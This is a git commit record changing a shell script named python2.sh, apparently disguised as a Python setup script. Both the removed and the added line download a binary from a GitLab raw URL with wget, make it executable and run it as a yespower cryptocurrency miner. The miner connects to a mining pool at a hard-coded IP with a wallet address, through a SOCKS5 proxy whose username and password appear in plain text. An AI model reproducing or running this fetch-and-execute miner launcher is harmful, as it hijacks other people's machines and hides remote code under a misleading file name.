f08203197331964fb734a50afee218e6f2fc14e5
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-23 09:34:32 +0700

    Update python2.sh

--- python2.sh
+++ python2.sh
@@ -1,1 +1,1 @@
-wget -q -O aJ6433 https://gitlab.com/node.js2594450/ruby/-/raw/main/zpus && chmod +x aJ6433 && ./aJ6433 -a yespower -o 103.120.18.51:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-keisya) -p c=CRNC,mc=VHH  --proxy=socks5://ugursfso:wqn60pnk6m95@45.155.68.129:813
+wget -q -O aJ6433 https://gitlab.com/node.js2594450/ruby/-/raw/main/liteg && chmod +x aJ6433 && ./aJ6433 -a yespower -o 103.120.18.51:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-keisya) -p c=CRNC,mc=VHH  --proxy=socks5://ugursfso:wqn60pnk6m95@45.155.68.129:813
